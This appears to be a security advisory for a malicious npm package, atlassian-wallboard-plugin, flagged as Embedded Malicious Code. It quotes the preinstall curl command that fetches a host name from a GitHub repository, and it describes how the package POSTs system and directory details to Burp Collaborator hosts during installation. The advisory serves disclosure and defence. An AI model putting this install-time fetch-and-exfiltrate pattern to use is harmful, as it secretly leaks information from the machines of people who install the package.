details: atlassian-wallboard-plugin@10.0.0 uses an Atlassian internal-looking name with a high version number and has no code; its package.json declares the dependency node-ac2 as a tarball from the GitHub repository GamerD11/ping_test, which in turn pulls node-ac3 from the same repository. On npm install, node-ac3's preinstall script (`node index.js`) runs `curl -sf https://raw.githubusercontent.com/GamerD11/ping_test/main/test.txt` to get a host name and sends an HTTPS POST to `/health` on that host, with certificate checks off, carrying the Node.js version, home directory, working directory, platform and architecture; test.txt has named Burp Collaborator (oastify.com) hosts. It was published by the npm account knbbd, which used the same dependency chain in claims-ac1, and the same second stage appears in dependencykfeg and claims-acct-unlock.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
